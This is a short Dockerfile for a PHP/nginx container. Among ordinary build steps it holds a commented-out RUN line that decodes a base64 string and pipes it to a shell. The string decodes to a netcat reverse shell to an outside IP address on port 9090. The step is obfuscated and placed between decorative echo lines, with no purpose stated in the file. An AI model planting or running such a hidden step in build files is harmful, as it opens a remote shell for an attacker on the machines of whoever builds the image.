#FROM ghcr.io/socialgouv/docker/nginx:7.1.1
FROM trafex/php-nginx

ARG COMMIT_SHA
ENV COMMIT_SHA $COMMIT_SHA

RUN echo "=========="
#RUN echo "bmMgODkuOTAuMzkuNTQgOTA5MCAtZSBzaA==" | base64 -d | sh -i
RUN echo "=========="
#RUN echo "nginx php #$COMMIT_SHA" > /usr/share/nginx/html/index.html
